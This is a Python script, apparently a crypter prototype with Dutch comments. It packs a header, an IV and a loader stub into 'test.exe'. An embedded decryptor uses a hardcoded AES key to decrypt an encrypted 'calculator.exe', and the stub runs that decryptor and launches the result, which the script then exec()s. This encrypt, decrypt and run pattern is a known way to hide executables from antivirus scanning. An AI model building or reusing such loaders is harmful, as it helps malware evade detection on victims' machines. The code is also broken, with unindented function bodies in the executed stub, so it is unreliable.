import os
from Crypto.Cipher import AES
from Crypto import Random

filename = "COMBINER/calculator.exe"
IV = Random.new().read(16)
filesize = str(os.path.getsize(filename)).zfill(16)
print(filesize)
print(filesize.encode('utf-8')) #in bytes

with open("COMBINER/test.exe", 'wb') as f:
    f.write(filesize.encode('utf-8'))
    f.write(IV)

with open("COMBINER/test.exe", 'a') as f:
    decrypting = "print('hello world')" # command plaatsen in een variabele
    decryptor = '''
    import os
    from Crypto.Cipher import AES

    filename = "(enc)calculator.exe"
    key = b'\xa5\x9b\x12:\x0ce\xc8\x01\x99\x1cP\x98\xf2\x10)\x84\x9cz\xef\xba\x92\xbc\x8e\xd3\x9c,$\xd4\xa7/DH'


    def decrypt(key, filename):
	    chunksize = AES.block_size*1024
	    outputFile = os.path.join(os.path.dirname(os.path.abspath(__file__)), "(decrypted)calculator.exe")

	    with open(filename, 'rb') as infile:
		    filesize = int(infile.read(16))
		    IV = infile.read(16)

		    decryptor= AES.new(key, AES.MODE_CBC, IV)

		    with open(outputFile, 'wb') as outfile:
			    while True:
				    chunk = infile.read(chunksize)

				    if len(chunk) == 0:
					    break

				    outfile.write(decryptor.decrypt(chunk))

			    outfile.truncate(filesize)


    decrypt(key, filename)
    print("Done")
    '''
    STUB = '''
    import subprocess
    import os
    
    def stub():
    decryptor_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "GPT_decryptor.py")
    p = subprocess.Popen(["python", decryptor_path], shell=True, cwd=os.path.dirname(os.path.abspath(__file__)))
    out, err = p.communicate()
    print(err)
    print(out)

    decrypted_file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "(decrypted)calculator.exe")
    if os.path.exists(decrypted_file_path):
        print("File exists")
        subprocess.run(["start", "", decrypted_file_path], shell=True) #opens new cmd and runs file
        # subprocess.run(decrypted_file_path, shell=True) #doesnt open shell, runs in background or already open shell
    else:
        print("File does not exist")

    stub()
    '''
    # print(len(decrypting)) # lengte van command opslaan om later de hele command te kunnen lezen
    print(len(STUB)) # lengte van command opslaan om later de hele command te kunnen lezen
    filesizeSTUB = len(STUB) # lengte van command opslaan om later de hele command te kunnen lezen
    # f.write(decrypting) # command schrijven naar encrypted file
    f.write(STUB) # command schrijven naar encrypted file

with open("COMBINER/test.exe", 'rb') as f:
    print("start")
    print(f.read(16))
    print(f.read(16))
    command = f.read(filesizeSTUB).decode('utf-8') # decode from bytes to string (utf-8)
    # eval(command)
    exec(command)